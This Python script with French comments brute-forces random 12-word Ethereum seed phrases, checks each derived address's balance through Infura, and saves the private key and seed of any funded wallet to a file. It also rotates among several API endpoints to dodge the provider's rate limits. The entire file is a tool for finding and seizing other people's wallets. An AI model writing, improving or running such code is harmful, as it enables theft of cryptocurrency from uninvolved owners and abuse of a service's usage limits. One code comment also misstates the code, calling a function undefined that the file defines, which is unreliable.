from web3 import Web3
from eth_account import Account
from mnemonic import Mnemonic

import os
import requests
import time
import random

# Fonction pour recuperer 12 mot de maniere aleatoire du fichier english.txt
def mot_aleatoire(nom_fichier, nbr_line=12):
    with open(nom_fichier, 'r') as fichier:
        lines = fichier.read().splitlines()
    mot_aleatoire = random.sample(lines, nbr_line)
    # Rassemble les mot aleatoire en un string avec un espace entre chaque mot
    return ' '.join(mot_aleatoire)

# Fonction pour ecrire sur une nouvelle ligne sur le fichier english.txt
def write_new_line(nom_fichier, text):
    with open(nom_fichier, 'a') as fichier:
        fichier.write(text + '\n')
      
# Fonction pour verifier que la mnemonic phrase est valide
def valid_mnemonic(mnemonic_phrase, language='english'):
    mnemo = Mnemonic(language)
    return mnemo.check(mnemonic_phrase)

# Vider le terminal
os.system('cls' if os.name == 'nt' else 'clear')

address = "your infura api address"
print("address: "+ address)

# La boucle while permet de verifier si la mnemonic phrase choisie
# contient un solde positif et ecrit le montant, seed phrase et la
# mnemonic phrase dans le fichier address.txt
lancer = True
while lancer:
    
    # Générer une phrase aléatoire en anglais depuis un fichier texte et limiter à 12 mots (mot_aleatoire n'est pas défini mais on présume qu'il s'agit d'une fonction personnalisée).    
    phrase_aleatoire = mot_aleatoire('english.txt', 12)
    
    # Vérifier si la phrase générée correspond aux critères attendus par `valid_mnemonic`. Si elle ne convient pas, il faudrait probablement répéter ou gérer cela différemment selon vos besoins spécifiques.
    is_valid = valid_mnemonic(phrase_aleatoire)

    if is_valid:
        time.sleep(0.01)
        Account.enable_unaudited_hdwallet_features()
        
        # Adresses Inufra utilisées successivement lorsque vous atteignez la limitation du taux de demandes.        
        adrs1 = "your infura api address"
        adrs2 = "your infura api address"
        adrs3 = "your infura api address"
        adrs4 = "your infura api address"
        adrs5 = "your infura api address"
        adrs6 = "your infura api address"
        
        # Connexion au noeud Ethereum via HTTP Provider fourni par Infura
        w3 = Web3(Web3.HTTPProvider(address))
        
        # Utiliser la phrase sélectionnée précédemment pour créer un compte grâce à web3py       
        seed_phrase = phrase_aleatoire
        account = Account.from_mnemonic(mnemonic=seed_phrase)
        private_key = account.key.hex()

        # Dériver l'adresse publique à partir de la clé privée trouvée ci-dessus
        account = w3.eth.account.from_key(private_key)
        public_address = account.address

        # Initialisation de la variable qui contiendra plus tard le solde ETH
        balance = None
        
        # Tentatives multiples pour obtenir le solde jusqu'à succès maximum de 5 fois
        for i in range(5):
            try:
                
                # Récupération du solde associé à l'adresse publique
                balance = w3.eth.get_balance(public_address) 
                break  # Sortie prématurée de la boucle après avoir reçu correctement le solde
            except requests.exceptions.HTTPError as e:
                
                # Gestionnaire spécial pour erreurs liées à la limitation du nombre de requêtes côté serveur
                if e.response.status_code == 429:
                    print("Limite de demande atteinte. En attente de nouvelle tentative…")
                    
                    # Changements progressifs entre différentes URL Infura afin de respecter leur politique concernant le volume de trafic autorisé
                    if address == adrs1:
                        address = adrs2
                        print("address2: "+ address)
                    elif address == adrs2:
                        address = adrs3
                        print("address3: "+ address)
                    elif address == adrs3:
                        address = adrs4
                        print("address4: "+ address)
                    elif address == adrs4:
                        address = adrs5
                        print("address5: "+ address)
                    elif address == adrs5:
                        address = adrs6
                        print("address5: "+ address)
                    else:
                        address = adrs1
                        print("address1: "+ address)
                    time.sleep(5)
                    
                else:
                    raise  # Relance toute autre sorte d'erreur non prévue
        
        
        if balance is not None:
            # Conversion manuelle du montant en wei vers ethers
            balance_in_ether = balance / 10**18  
            print(f"Balance: {balance_in_ether} ETH")
            
            # Seuls afficher et stocker les informations pertinentes (Privatekey, balance, Seed) quand le solde est positif.
            if balance_in_ether > 0:
                write_new_line("address.txt", "PrivateKey: " + private_key + " - " + "Balance: " + str(balance_in_ether) + " - " + "Seed: " + seed_phrase)
                os.system('cls' if os.name == 'nt' else 'clear')
